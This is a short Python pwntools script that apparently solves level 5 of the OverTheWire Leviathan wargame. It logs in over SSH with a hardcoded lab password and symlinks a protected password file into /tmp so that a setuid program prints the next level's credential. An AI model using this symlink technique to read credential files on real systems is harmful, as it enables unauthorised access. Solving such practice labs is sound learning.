from pwn import *
import re
username = "leviathan5"
password = "Tith4cokei"
host = "leviathan.labs.overthewire.org"
port = 2223

shell = ssh(username, host, password=password, port=port)
p = shell.run('sh')
p.sendline("ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log")
p.sendline("./leviathan5")
log.success("The password for leviathan6 is === " + p.recvline().decode("utf-8"))
p.close()

